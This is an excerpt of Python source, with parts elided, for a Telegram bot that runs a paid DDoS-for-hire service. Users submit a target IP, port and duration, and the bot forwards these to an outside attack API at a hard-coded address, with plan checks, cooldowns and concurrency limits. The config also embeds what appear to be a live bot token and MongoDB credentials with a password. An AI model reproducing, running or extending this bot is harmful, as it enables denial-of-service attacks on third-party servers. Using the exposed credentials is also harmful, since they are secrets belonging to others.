...
# ================= CONFIG =================
BOT_TOKEN = "8998317099:AAFuCS7AM_jNTbYwouvgC9oIZ1YPGGrBV2w"
BOT_OWNER = 7944283616
BOT_OWNER_2 = 7944283616

# Required Channels for join verification
REQUIRED_CHANNELS = []  # No channels required

MONGO_URI = "mongodb+srv://flushi3693694_db_user:150qCqkKFkWlT2bh@cluster0.wdfotef.mongodb.net/?appName=Cluster0"
DB_NAME = "attack_bot"

# ================= FIXED API CONFIG =================
# API uses: ?key=professor&ip=TARGET&port=PORT&time=DURATION
DEFAULT_API_URL = "http://54.163.45.50:4545/attack"
DEFAULT_API_KEY = "professor"

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_COOLDOWN = 80
DEFAULT_MAX_CONCURRENT = 2  # CHANGED: Max concurrent attacks set to 2
    ...
    try:
        if settings_col.count_documents({}) == 0:
            settings_col.insert_one({
                ...
                "max_concurrent_attacks": 2,  # CHANGED: Set to 2
...
def is_user_joined_channel(user_id, channel_id):
    return True  # Always return True since no channels required
...
def check_channel_verification(user_id):
    return True  # Always verified since no channels required
...
def get_group_limits(chat_id):
    try:
        ...
        if doc:
            return (
                doc.get("max_concurrent", 2),  # CHANGED: Default to 2
        ...
        return 2, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)  # CHANGED: Default to 2
    except:
        return 2, DEFAULT_MAX_ATTACK_TIME, DEFAULT_COOLDOWN  # CHANGED: Default to 2
...
def get_user_limits(user_id):
    ...
    if plan and has_valid_plan(user_id, send_expiry_msg=False):
        return (2,  # CHANGED: Default to 2 for authorized users
...
def check_access(message):
    ...
    # Channel verification is always passed (no channels required)
...
def get_user_active_attack_count(user_id):
    """Get number of active attacks for a specific user"""
    with _attack_lock:
        now = datetime.now()
        count = 0
...
# ================= FIXED: Attack Function with correct API parameters =================
def execute_attack(target, port, duration):
    ...
    # API expects: ?key=professor&ip=TARGET&port=PORT&time=DURATION
    full_url = f"{url}?key={api_key}&ip={target}&port={port}&time={duration}"
    ...
    try:
        ...
        logger.info(f"API Response Body: {resp.text[:200]}")
        
        if resp.status_code == 200:
            return resp
        else:
            # Try alternative parameter order
            alt_url = f"{url}?ip={target}&port={port}&time={duration}&key={api_key}"
            resp2 = session.get(alt_url, timeout=15)
    ...
    class DummyResponse:
        def __init__(self):
            ...
            self.text = '{"message": "API unreachable", "success": false}'
...
def handle_callback(call):
    try:
        ...
        # No channel verification needed, just acknowledge
    ...
    try:
        ...
        if is_owner(user_id):
            welcome_msg = (
                ...
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Bot Status:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', 2)}\n"
    ...
    try:
        ...
        if is_owner(user_id):
            help_text = (
                ...
                f"• /setconcurrent &lt;num&gt; - Max concurrent (1-10)\n"
...
def ping_command(message):
    try:
        ...
        max_conc = get_setting("max_concurrent_attacks", 2)
...
def handle_attack(message):
    try:
        ...
        max_concurrent_global = get_setting("max_concurrent_attacks", 2)
...
def generate_status_text(user_id=None):
    active_count = get_active_attack_count()
    max_global = get_setting('max_concurrent_attacks', 2)
    ...
    text += (
        f"┌─ <b>BOT SETTINGS</b>\n"
        f"├ 🔢 Max Concurrent: {get_setting('max_concurrent_attacks', 2)}\n"
    ...
    try:
        ...
        if len(parts) < 5:
            bot.reply_to(message, 
                        ...
                        "Example: /approve -1001234567890 2 300 60\n\n"
                        "📋 <b>Parameters:</b>\n"
...
def server_stats_command(message):
    try:
        ...
        stats_text = (
            ...
            f"━━━━━━━ <b>BOT</b> ━━━━━━━\n"
            f"🔥 <b>Active Attacks:</b> {active_attacks}/{get_setting('max_concurrent_attacks', 2)}\n"
    ...
    try:
        ...
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /setapi &lt;api_url&gt; &lt;api_key&gt;\n\n"
                        "Example: /setapi http://54.163.45.50:4545/attack professor")
            return
        ...
        bot.reply_to(message, 
                    ...
                    f"📋 Format: ?key=KEY&ip=IP&port=PORT&time=TIME")
...
def set_concurrent_command(message):
    try:
        ...
        if value < 1 or value > 10:
            bot.reply_to(message, "❌ Value must be between 1 and 10.")
            return
        
        old_value = get_setting("max_concurrent_attacks", 2)
...
if __name__ == "__main__":
    ...
    logger.info(f"Max Concurrent: {get_setting('max_concurrent_attacks', 2)}")
    ...
    try:
        startup_msg = (
            ...
            f"├ API Format: ?key=KEY&ip=IP&port=PORT&time=TIME\n"
            f"└ API: {get_setting('api_url', 'Default')[:50]}...\n\n"
            f"🔄 Bot is ready for operations!\n"
            f"📊 Max concurrent attacks: 2"
        )
